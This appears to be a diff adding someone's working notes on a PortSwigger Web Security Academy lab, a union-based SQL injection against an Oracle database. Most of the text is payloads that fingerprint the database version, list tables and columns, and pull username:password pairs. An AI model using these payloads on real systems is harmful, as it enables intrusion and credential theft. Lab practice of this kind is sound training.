@@ -1,0 +1,40 @@
+https://0adc00a7045c1527c00a1b9f00f0003d.web-security-academy.net/filter?category=Pets'union select NULL,NULL from dual--
+
+dual need to mention
+
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+select banner FROM v$version
+
+https://0adc00a7045c1527c00a1b9f00f0003d.web-security-academy.net/filter?category=Pets'union select NULL,banner from v$version--
+
+Database contents
+
+You can list the tables that exist in the database, and the columns that those tables contain.
+Oracle 	SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+
+display all tables:
+
+https://0a89006204ca5b53c0a42f8900100048.web-security-academy.net/filter?
+category=Pets%27union%20select%20null,table_name%20from%20all_tables--
+
+
+display column name:
+
+
+category=Pets%27union%20select%20null,column_name%20from%20all_tab_columns WHERE table_name='USERS_FZXDJA'--
+
+USER$
+
+
+Table:
+USERS_FZXDJA
+
+PASSWORD_KCZIUK
+USERNAME_KDFKOU
+
+
+Pets'union+select+null,USERNAME_KDFKOU+from+USERS_FZXDJA--
+Pets'union+select+null,USERNAME_KDFKOU||':'||PASSWORD_KCZIUK+from+USERS_FZXDJA--
+
